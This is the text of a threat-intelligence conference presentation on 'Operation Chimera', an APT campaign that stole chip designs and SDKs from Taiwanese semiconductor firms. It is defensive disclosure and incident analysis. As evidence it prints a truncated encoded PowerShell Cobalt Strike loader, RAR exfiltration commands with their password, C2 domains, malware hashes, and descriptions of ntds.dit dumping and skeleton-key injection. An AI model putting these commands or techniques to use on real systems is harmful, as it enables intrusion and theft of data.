Operation Chimera - APT Operation Targets Semiconductor Vendors
Chung-Kuan Chen, Inndy Lin, Shang-De Jiang
CyCraft Proprietary and Confidential Information

Whoami

C.K Chen
 Senior Researcher at CyCraft  Retired CTF Player ­ BambooFox Founder  HITCON/HITB Review Board  CHROOT member

SHANG-DE Jiang
 Security Researcher at CyCraft  UCCU Hacker Co-Founder
CyCraft Proprietary and Confidential Information

Inndy Lin
 Security Researcher at CyCraft  Reverse Engineering Hobbyist  Presented in HITCON, ROOTCON

CyCraft

CyCraft is an AI company that forges the future of cybersecurity resilience through autonomous systems and human-AI collaboration.

CyCraft in MITRE ATT&CK Evaluation
CyCraft Takes Significant Alerting Lead in MITRE ATT&CK® Evaluations' Latest Round

Outline
· Introduction · Case Study
· A Company · B Company
· Threat Actor's Digital Arsenal · Conclusion

Critical Incidents in Taiwan's Supply Chain/Critical Infrastructure

TSMC Ransomware

ASUS Supply Chain Attack ColdLock against CPC

CyCraft Proprietary and Confidential Information

Taiwan's Importance in the Semiconductor Landscape
 With decades of development, Taiwan has established itself as a leading player in the
semiconductor industry. Some of the well-known leaders include TSMC and MTK
· "Taiwan is set to become the largest and fastest-growing semiconductor equipment maker in the
world by increasing by 21.1 percent to reach US$12.31 billion." -Taiwan News, July 2019
CyCraft Proprietary and Confidential Information

Cyberattack to semiconductor vendors
v Just like the TSMC ransomware, a cyberattack against semiconductor could potentially
v Seriously impact Taiwan's economy v Affect the entire global supply chain
v In this report, we will show how IT attacks on semiconductor vendors can be just as dangerous as an OT attack.
v Attack to OT - production line halt, immediately damage v Attack to IT - leak important intelligence property, long-term damage

Large-scale APT attacks on Semiconductor Industry
Vendors located at the Hsinchu Science Park(HSP) were targeted
Between 2018 and 2019, we discovered several attacks on semiconductor vendors
Extensive attack: > 7 semiconductor vendors were attacked
After our white paper was published, the received feedback revealed that more than 7 vendors were targeted by the same threat actor
Not a single point attack, but an attack on the entire industry surface The APT attacks on the important vendors were precise and well-coordinated. Aside from the vendors themselves, their subsidiaries, and competitors were all targeted

Group Chimera
CyCraft Proprietary and Confidential Information

As the activities, attack techniques,
and tactics were similar, we believe this was the work of the same threat actor
Target: Semiconductor Vendors
Malware: Merged different Open
Source Tools (Dumpert and Mimikatz , CobaltStrike)
C2: C2 hosted in Public Cloud
(Google App Engine, Azure)
Goal: Steal Documents, Source code,
SDK of chip related projects

Investigation Overview

Investigation Period: 2018~2019

Investigated Vendors: 3+

Total Endpoints Analyzed: 30k

Today's Case Study
Ø The three vendors involved in the analysis currently have a leading global position in their own market segments
Ø Due to the different investigation time points, the analytical perspective of the attack campaign was different

A Company
· Our long-term partner. The longterm monitoring allowed more details of the attacker's activities to be revealed.
· The detailed information enabled us to track the root cause.

B Company
· One-time IR service. When the investigation started, it was already a long time after the attacks happened.
· Highlighted the threat actor's long-term activities and what data was leaked.

C Company
· Long-term partner with high security capacity.
· Help us to deep investigate, get a lot feedback from them
· Give us more information to illustrate threat actors

Non-representative. Only for illustration purposes
In the following slides, every machine and username are de-identified, not original names

A Company

Case A: Overview
Ø Activity date: 2019/12/09 ~ 2019/12/10 Ø 15 endpoints and 6 user accounts were
compromised
Ø Note that all the names are de-identified
Ø Four malwares and eight C2 servers were found

Cobalt Strike
Disguised Cobalt Strike beacon as Google Update.exe
VT search found nothing Injected payloads into other processes
Found in two endpoints: Server-LAUREN & PC-SHENNA
CyCraft Proprietary and Confidential Information

Used Hosting Server for C2
Network security devices had difficulty detecting the associated C2 servers, as they
were in the Google Cloud Platform.
Created backdoor which was disguised as Google Update. Other cloud hosting services were also abused
CyCraft Proprietary and Confidential Information

Root Cause Analysis - PC-SHENNA
With our Timeline Analysis, we found that the backdoor in PC-SHENNA was
implanted from Server-LAUREN

ServerLAUREN
CyCraft Proprietary and Confidential Information

Attack was launched right before employees began to get off work
PCSHENNA

Remote Execution Tools

Applied benign program to achieve their malicious activities

schtasks

WMIC

The first Cobalt Strike backdoor was Server-LAUREN used wmic to remotely

located at NB-CLAIR, and was then execute various commands in another

remotely copied to Server-LAUREN

endpoint to check if there was an

A valid account was used to invoke Internet connection

Cobalt Strike via schtasks

CyCraft Proprietary and Confidential Information

Root Cause Analysis - Server-LAUREN

Due to our new findings, additional
information could be added to our investigation graph

ServerSHANAE

ServerLAUREN

PC-SHENNA

CyCraft Proprietary and Confidential Information

ServerMELINA

Root Cause Analysis - Server-LAUREN
Server-LAUREN remotely used an archive tool to collect registry and ntds.dit in
Server-MELINA(DC) for offline breaking
CyCraft Proprietary and Confidential Information

NTDS.DIT Explanation
Active Directory data was stored in the ntds.dit ESE database file. Two copies of
ntds.dit were present in separate locations on a given domain controller.
%SystemRoot%\NTDS\ntds.dit %SystemRoot%\System32\ntds.dit
ntds.dit is the AD database, containing domain hosts and users information(e.g. ID, name, email and password). As ntds.dit was encrypted, and the key was stored I the SYSTEM registry, the adversary also needed to make a copy of the registry data.
CyCraft Proprietary and Confidential Information

Root Cause Analysis - NB-CLAIR

Through correlation analysis, our AI investigation
showed that NB-CLAIR used Schedule Task to place malware to the schedule tasks of Server-LAUREN

ServerSHANAE
wmic

NB-CLAIR

schtasks

ServerLAUREN

schtasks

PCSHENNA

schtasks

ServerMELINA

CyCraft Proprietary and Confidential Information

Root Cause Analysis - NB-CLAIR
In the NB-CLAIR timeline, we discovered six minutes before the scheduled task
execution, IP1 used RDP and User-01 to make a successful login
This is highly likely to be the root cause of the attack
CyCraft Proprietary and Confidential Information

Recon
Several "net user" commands were executed
for recon purposes, and the results were saved to the RecordedTV_lib.log
CyCraft Proprietary and Confidential Information

Data Exfiltration
RECORDEDTV.MS was used to archive the stolen data for data exfiltration
Identical binaries were found in several machines, but under different names, e.g.
RECORDEDTV.MS, uncheck.dmp, and jucheck.exe
RAR software, had a one-byte discrepancy from the original version
The same file was also found on other machines. Thus, it is likely to have been used
in past attacks
Inserting malware in a location, where legal software is stored, seems to be a
characteristic tactic of Operation Chimera
CyCraft Proprietary and Confidential Information

Root Cause Analysis­ IP1
IP1 is a unscanned host and related to many accounts. It could be a shared machine
or a VPN host
VPN can also be compromised. Never use VPN as your only line of defense
CyCraft Proprietary and Confidential Information

B Company

B Company : Overview

· Investigation Reason

B company compromise

B has business cooperation with C company

B&C create a bridge between their networks

· Statistic Summary

Time Period

# of Event # of compromised endpoints

2018/8/7 ~ 2019/12/11 140k+

14

C discovers anomaly
activities from B

Asks us to investigate

# of data leaks # of malware

9

10

Powershell
Fileless
10 endpoints, which included two
domain controllers

The powershell script executed a
Cobalt Strike backdoor and was used for process migration to other system processes svchost.exe

powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwB uAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAE EAQQBBAEEAQQBLAFYAVwBiAFcALwBpAE8AQgBEACsAMwBQAHcASwBYADQAVgAwAG8ASgBaADMAdABnAHQAZABWAFYAb wBuAFEAQQBrAGwAbABKAGMAVwAyAGsAWABWAHkAUwBRAG0AdQBEAGcASgBkAFoAeQBtAGQATABmAC8ALwBTAFkAdgA1 AEoAYgAyAGIAawArADYAaQB4AFEAbABuAHMAdwA4AE0AOAA5ADQAUABKAE0AcABsAGMAVwBwAEYATQB5AFUAaABtAGQ AUgBWAEoAeABSADQAVABQ

CyCraft Proprietary and Confidential Information

APT Attack
Cobalt Strike was used to inject the malware
into the system, enabling the attacker to access the system and communicate with a C2
C2: striking-pipe-253603.appspot.com,
172.217.27.148:443, msplatformupdates.azureedge.net, chromeapplatses.appspot.com
CyCraft Proprietary and Confidential Information

Cyber Situation Graph
v Company already seriously hacked
v Difficult to manually investigate, needed help from A.I.

 2018.11
 2019.03  2019.06
 2019.09

Hacker returns on a quarterly basis to collect new data.

 2019.11, Deploy new weapon SkeletonKey Injector  2019.12, Harvest new endpoints

Archive Password

c:\users\xxxx\libraries\RecordedTV.ms a -m5 v71m ­hpf**kyou.google.com11 vmlum-vss.log vmlum-vmvss.log C:\Windows\system32\cmd.exe /C c:\users\xxxxxx\libraries\RecordedTV.ms a -m5 -r ­hpf**kyou.google.com11 vmlum-vmopt.log "\\<Hostname>\personal\<Username>\<Product>Traning-v1.1.pptx" > vmlumss.log & dir vmlumvmopt*

The actor also used a RAR
program with innocuous file names, such as RecordedTV.ms, jucheck.exe and vmware.log to archive and steal the data of interest
 A similar scheme was utilized by
the attacker to archive the passwords they used

CyCraft Proprietary and Confidential Information

Leaked File Name
During our investigation, we made an inventory of the leaked data. Some of the
data is shown below:
\\Users\<Account>\Project\Roadmap \\Users\<Account>\Backup\Workspace \\Users\<Account>\chip and SDK setting \\Users\<Account>\<Productname> SDK Installation guide.pdf
Attacker's intent was stealing intelligence property Business spy? State-sponsor attack to benefit a certain industry?
CyCraft Proprietary and Confidential Information

C Company

Utilize Cloud Storage
Ø Exfiltration Tool: 3 in 1 Cloud-Storage Tool (GDrive, Dropbox, OneDrive)
Ø MD5:
Ø V1: be16e6cf8cc63415a1c77a59fa43deba (no record in VT) Ø V2: 4d5440282b69453f4eb6232a1689dd4a (onedrive.exe)
Ø Use Cloud-based Storage Web API to transfer file -> able to bypass L7 firewall
Ø Exfiltration Tool: another Cloud-Storage Tool (Openload Free Space)
Ø C# Program

3 in 1 Cloud-based Storage Transfer Tool

Storage Type

auth Token

Uploaded File Path

Profile of the Campaign
Ø Language - Simplified Chinese

Profile of the Campaign

v Language - Simplified Chinese

Chimera Campaign has at least one member understanding Chinese

Profile of the Campaign

v Hacker Active Timeline(2019)

v Working hours
v 8:30 - 12:30 to 13:30 ­ 20:30 (UTC +8)
v Working days
v Mon. ~ Fri. ß Normal Time v Wed. ß most busy v Sat. ß Event Driven overtime

The campapaign is at the same timezone to TW (UTC+8)

Actors' Digital Arsenal

Actors' Digital Arsenal
Cobalt Strike Beacon WinRAR SkeletonKey Injector Winnti Backdoor
CyCraft Proprietary and Confidential Information

Cobalt Strike Beacon

Cobalt Strike Beacon
Cobalt Strike Beacon was used as main backdoor Overwrite GoogleUpdate.exe for persistency Identical file was discovered in 3+ companies C2
 chrome-applatnohp.appspot.com  ussdns04.heketwe.com  ussdns02.heketwe.com  ussdns01.heketwe.com
CyCraft Proprietary and Confidential Information

Suspicious R-W-X Memory
Our product detected suspicious memory block
CyCraft Proprietary and Confidential Information

Hybrid Payload: PE as Shellcode
"MZ" signature can be decoded as "pop r10" under x64 architecture
"dec ebp; pop edx" under x86 architecture
At offset 0x1791c is a shellcode-like function called "reflective loader" 0x56A2B5F0 is the hash value of "ExitProcess"
Locate address of itself, and use it as first argument (rdi)
Compute address of reflective loader and execute it
CyCraft Proprietary and Confidential Information

Injection Strategy: Named Pipe

Malicious Process Execute

Inject Stager Shellcode

Execute

Real Payload

CobaltStrike Beacon Module

Spawn

Target Process

Named Pipe

CyCraft Proprietary and Confidential Information

WinRAR

WinRAR
They use rar.exe to compress and encrypt the files to be stole There's a folder named "RecordedTV.library-ms" under same path
CyCraft Proprietary and Confidential Information

Mutated rar.exe
The file was uploaded to VirusTotal in 2009 It's rar.exe from WinRAR 3.60b8 but different from original one
Only 1byte was different, but we've confirmed that was not a crack This patch may cause the program crash
Hypothesis 1: Change file hash to avoid detection Hypothesis 2: Bit flip during copy

Patch diff (before / after)
CyCraft Proprietary and Confidential Information

Disassembly of patch

SkeletonKey Injector

SkeletonKey Injector
A new malware combined "dumpert" and "mimikatz"
"mimikatz" is a well-known hacking tool
l Most people use it to dump Windows credentials, but its capability is more than that
"dumpert" is a tool to dump lsass.exe memory stealthily
CyCraft Proprietary and Confidential Information

Dumpert
Made by a security company called Outflank Dump lsass.exe stealthy via direct system call Windows system call numbers changed from release to release DLL export function is the only stable interface That's why Windows shellcode always needs to locate DLLs in memory
CyCraft Proprietary and Confidential Information

Dumpert: Implementation
Use ntdll!RtlGetVerion to determine Windows version Load different syscall function for different version Bypass any user-space hook
CyCraft Proprietary and Confidential Information

SkeletonKey
APT malware discovered by DELL Secureworks in 2015 Implants a backdoor password to domain controller
The original password was still valid, wrong password still got rejected
Inject code into lsass.exe process to alter authentication routine
CyCraft Proprietary and Confidential Information

Impact of SkeletonKey Injector
No need to use administrator credentials for lateral movement It leaves nearly no clue, only logon success events You must reboot domain controller to clean the SkeletonKey We've observed some other attack that using modified mimikatz
CyCraft Proprietary and Confidential Information

Winnti Backdoor

Strange Network Tool: baseClient.exe
We thought that was a network probing tool
CyCraft Proprietary and Confidential Information

Winnti Backdoor
We thought baseClient.exe in our public report was a network probing tool
It's actually Winnti backdoor
CyCraft Proprietary and Confidential Information

Other APT Events in Taiwan

ColdLock Ransomware
Taiwan's national gasoline company was hit by ransomware ColdLock was based on an open-source ransomware: EDA2 Ministry of Justice Investigation Bureau said the attack was related to Winnti group
CyCraft Proprietary and Confidential Information

SkeletonKey Attack in Taiwan
Serval attacks against Taiwan government agencies used SkeletonKey Modified version of mimikatz executed file-lessly
When OpenProcess failed, it will load mimikatz driver to unprotect lsass.exe and try again.
CyCraft Proprietary and Confidential Information

Take Away
Disclosure a large-scale APT attacks targeting semiconductor; more
than 7 vendors are compromised.
Precisely attacks. Targets leading semiconductor vendors, their
subsidiaries, partners and competitors.
Their goals is stealing intelligence property(documents, source code,
SDK of chip related projects). Make long-term damage to the victim.
CyCraft Proprietary and Confidential Information

Take Away
Attackers utilize varies open source, general tools to make attribution
harder.
In 2 shared case studies, AD & VPN are compromised. Enterprises
should consider resilience of IT systems. Avoid relying on a single security service.
A rarely used SkeletonKey technique is used, which makes
adversaries login like normal user. - Persistence, Defense Evasion.
No system is safe. Regularly threat hunting, shorten the MTTD/MTTR.
CyCraft Proprietary and Confidential Information

Thanks for your listening!
Welcome to Ask Questions

Appendix ­ MITRE ATT&CK and IoC
CyCraft Proprietary and Confidential Information

Tactic

ID

Initial Access

T1133

Execution

T1047

T1086

T1053

Defense Evasion

T1055

CyCraft Proprietary and Confidential Information

Technique External Remote Services Windows Management
Instrumentation Powershell
Scheduled Task Process Injection

Description
The threat actor's first entry point was from a VPN server, where a valid account was used. We believe the actor acquired the password from a separate data breach to login to the VPN.
The threat actor used wmi to remotely execute commands on another endpoint for reconnaissance, primarily checking the
Internet connection availability.
The threat actor used a Cobalt Strike powershell script for process migration to other system processes. Meanwhile, BloodHound was used to assess the privilege settings in the
Active Directory (AD) domain and devise attack paths.
The threat actor leveraged scheduled tasks to launch APT malware to a remote system using domain controller account credentials. After the execution, the threat actor removed the
scheduled task information to hide the system artifact.
The discovered memory module showed that Cobalt Strike conducted process injection to migrate to other processes.

Tactic Discovery

ID

Technique

Description

T1087

Account Discovery

The 'net user' commands were used to recon user information. The final results were dumped to RecordedTA_lib.log.

Credential Access

T1003

Credential Dumping

NTDS from Domain Controller, threat actor collected registry and ntds.dit in other hosts from the domain controller for offline breaking. The threat
actor merged code from dumpert and mimikatz to dump system credentials, which was hard to detect by security products.

Persistence Lateral Movement
Command and Control Exfiltration

T1098
T1076 T1077 T1102 T1532
T1002

Account Manipulation
Remote Desktop Protocol
Windows Admin Shares
Web Service

The threat actor used Skeleton key to inject false credentials into domain controllers with the intent of creating a backdoor password. This stealthy
technique was hard to detect.
The threat actor used a valid account to remotely login to the system.
The threat actor used windows admin share to collect and LM to remote system.
The threat actor widely used Google's appspot to host their C2 servers.

Data Encrypted

One characteristic of the threat actor was using "fxxkyou.google[.]com" as the password to encrypt the stolen data.

Data Compressed

This program was a modified RAR software, where there was a one byte inconsistency over the original version.

CyCraft Proprietary and Confidential Information

Malware
Hash f2d4a35f20cd92c13cab8f6a50995a3b 389d184ef0b0b2901c982c421142cbb1 c9b8cab697f23e6ee9b1096e312e8573 a403d96953eb867f3092751d0763c7d0 bb897e34bc0d1e82dfe79d0898f5aa88 be16e6cf8cc63415a1c77a59fa43deba 4d5440282b69453f4eb6232a1689dd4a 3c2447e278318c4e6b50d5095e7028e5 a8559c4bcd299125036583febe1a53fb
CyCraft Proprietary and Confidential Information

Description ColbaltStrike backdoor ColbaltStrike backdoor Archive Tool (Greyware) Persistence Persistence 3 in 1 Cloud Storage, Data Exfiltration 3 in 1 Cloud Storage, Data Exfiltration Event Log Dump Tool Winnti Backdoor

C2 Domain
chrome-applatnohp.appspot[.]com ussdns04.heketwe[.]com ussdns01.heketwe[.]com 78276.ussdns02.heketwe[.]com 78276.ussdns01.heketwe[.]com
CyCraft Proprietary and Confidential Information

Other Malware IoC

Hash 234d17d8978717d33bf53015760878ea 28991de4ef6d97b324503991adb6bc0b 7aab677263be856a668dc3d38334fcd8 0998f695ddd72f1ed0f8937929f1afdd
7940616f980cd031d61f3d3a9d454c17 d770a361646a0463f597c127e0705265 3838d0f1cb10f04632a6ca7fd79c3d0d c3a077bc0e4095d68569817b51bea7a2 cb1f2894cd35b173140690b0a608d4b6
CyCraft Proprietary and Confidential Information

Description COLDLOCK Powershell Loader COLDLOCK .Net Malware COLDLOCK Powershell Loader V2 COLDLOCK .Net Malware V2
SkeletonKey Attack, msehp.dat SkeletonKey Attack, Windows Event Manageex.dll SkeletonKey Attack, Mimikazt fileless SkeletonKey Attack, WinHelp.sys SkeletonKey Attack, wmipd.dll

